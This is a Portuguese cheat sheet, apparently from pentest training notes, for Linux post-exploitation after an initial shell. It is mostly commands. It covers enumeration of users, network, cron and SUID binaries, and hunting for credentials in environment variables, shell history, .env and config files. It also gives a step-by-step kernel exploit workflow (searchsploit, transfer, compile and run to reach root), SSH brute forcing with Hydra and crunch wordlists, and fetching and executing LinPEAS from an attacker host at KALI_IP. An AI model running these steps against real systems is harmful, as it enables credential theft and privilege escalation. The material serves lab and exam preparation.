---
layout: cyber
section: pos-expl-linux
title: "Enumeração Linux Completa — Pós-Exploração"
---

# Enumeração Linux Completa — Pós-Exploração

> Situational awareness após shell inicial — mapear superfície antes de tentar privesc.

---

## Situational Awareness Imediato

```bash
# Identidade
id && whoami
id | grep -o "groups=.*" | tr ',' '\n'    # grupos detalhados

# Sistema
hostname
cat /etc/issue                             # distro + versão user-facing
cat /etc/os-release                        # ID, VERSION_ID, etc.
uname -a                                   # kernel + arquitetura

# Usuários com shell
cat /etc/passwd | grep -v nologin | grep -v false

# Processos em execução
ps aux
ps aux | grep -v "\[" | grep -v "^root"   # processos não-root não-kernel
```

---

## Rede

```bash
ip a                          # interfaces e IPs
ip route                      # tabela de rotas
routel                        # alternativa legível
ss -anp                       # sockets — TCP/UDP/Unix com PID

# Conexões estabelecidas
ss -tnp state established

# Verificar firewall
cat /etc/iptables/rules.v4    # regras iptables salvas
sudo iptables -L -n           # se tiver sudo
```

---

## Cron Jobs

```bash
# Todos os crontabs
ls -lah /etc/cron*
ls -lah /var/spool/cron/crontabs/

# Crontab do usuário atual
crontab -l

# Crontab de root (se tiver sudo)
sudo crontab -l

# Cron de todos os usuários (requer privilégio ou /var/spool legível)
for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== $user ==="; crontab -u $user -l 2>/dev/null
done
```

Jobs cron rodando como root + script editável = privesc.

---

## SUID e SGID

```bash
# Binários SUID (executam como dono, geralmente root)
find / -perm -u=s -type f 2>/dev/null

# Binários SGID
find / -perm -g=s -type f 2>/dev/null

# Verificar no GTFOBins: https://gtfobins.github.io/
# Filtrar por binários conhecidos
find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null | grep -E "vim|find|bash|python|perl|nmap|cp|mv|awk|sed"
```

---

## Credential Hunting

```bash
# Variáveis de ambiente com credenciais
env | grep -i "pass\|key\|secret\|token\|api\|credential"

# Histórico de shell
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history

# Arquivos de config do usuário
cat ~/.bashrc ~/.bash_profile ~/.profile

# Arquivos .conf com password
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null

# Arquivos .env
find / -name ".env" -readable 2>/dev/null

# Arquivos PHP/config web (credenciais de banco)
find /var/www -name "*.php" -readable 2>/dev/null | xargs grep -l "password\|db_pass\|DB_PASS" 2>/dev/null

# Arquivos de backup que podem conter senhas
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null | grep -v proc
```

---

## Software Instalado e Versões

```bash
# Debian/Ubuntu
dpkg -l
dpkg -l | grep -i "apache\|nginx\|ssh\|mysql\|postgres"

# Red Hat/CentOS
rpm -qa
rpm -qa | grep -i "apache\|nginx\|ssh\|mysql"

# Verificar binários em PATH
which python python3 perl ruby gcc nc netcat socat curl wget 2>/dev/null
```

---

## Diretórios e Arquivos Editáveis

```bash
# Diretórios editáveis pelo usuário atual
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Arquivos editáveis em diretórios do sistema (risco de PATH hijacking)
find /etc /usr/local/bin /usr/bin -writable -type f 2>/dev/null

# Arquivos de script em diretórios editáveis
find / -writable -name "*.sh" 2>/dev/null | grep -v proc
```

---

## Kernel e Módulos

```bash
# Versão do kernel
uname -r
arch

# Módulos carregados
lsmod

# Informações de módulo específico
/sbin/modinfo MODULE_NAME

# Buscar exploits de kernel
searchsploit "linux kernel $(uname -r | cut -d'-' -f1)"
searchsploit "linux kernel ubuntu 16 local privilege escalation" | grep "4\." | grep -v "< 4.4" | grep -v "> 4.8"
```

---

## Workflow Kernel Exploit

```bash
# 1. Identificar versão
uname -r && cat /etc/os-release | grep VERSION

# 2. Buscar exploit
searchsploit "linux kernel ubuntu 16 local privilege escalation"

# 3. Filtrar versões compatíveis
searchsploit "linux kernel 4" | grep -v "< 4.4" | grep -v "> 4.8"

# 4. Obter exploit
searchsploit -m linux/local/45010.c
# Ler instruções de compilação no header
head -n 20 45010.c

# 5. Transferir source para alvo (compilar no alvo evita problemas de arquitetura)
scp 45010.c user@target:/tmp/

# 6. Compilar e executar no alvo
ssh user@target
cd /tmp && gcc 45010.c -o exploit && chmod +x exploit && ./exploit

# 7. Verificar
id    # deve mostrar uid=0(root)
```

---

## Wordlist Customizada + Hydra para Senha Local

Quando senha de usuário local é necessária mas não encontrada em wordlists padrão.

```bash
# Criar wordlist baseada em padrão observado
crunch 6 6 -t Lab%%%   > wordlist.txt     # Lab + 3 dígitos
crunch 8 8 -t Pass%%%%  > wordlist2.txt   # Pass + 4 dígitos

# Brute force SSH com wordlist customizada
hydra -l eve -P wordlist.txt 192.168.1.10 -t 4 ssh -V
```

---

## Ferramentas Automatizadas

```bash
# unix-privesc-check
./unix-privesc-check standard   # verificações básicas rápidas
./unix-privesc-check detailed   # mais completo, mais demorado

# LinPEAS — mais completo e atualizado
chmod +x linpeas.sh && ./linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# LinEnum
chmod +x LinEnum.sh && ./LinEnum.sh -t
```

### Transferir Ferramentas para o Alvo

```bash
# Do Kali
sudo python3 -m http.server 80

# No alvo
wget http://KALI_IP/linpeas.sh -O /tmp/linpeas.sh
curl -s http://KALI_IP/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

---

## Checklist Rápido

```
[ ] id, whoami, grupos
[ ] Kernel + distro + versão
[ ] Processos em execução (serviços internos, crons ativos)
[ ] Conexões de rede (serviços locais não expostos externamente)
[ ] Cron jobs + scripts chamados por root
[ ] Binários SUID — verificar no GTFOBins
[ ] Variáveis de ambiente + bash_history
[ ] Arquivos .conf/.env com credenciais
[ ] Diretórios editáveis pelo usuário atual
[ ] Software instalado com versões — searchsploit
[ ] Rodar LinPEAS para cobertura completa
```
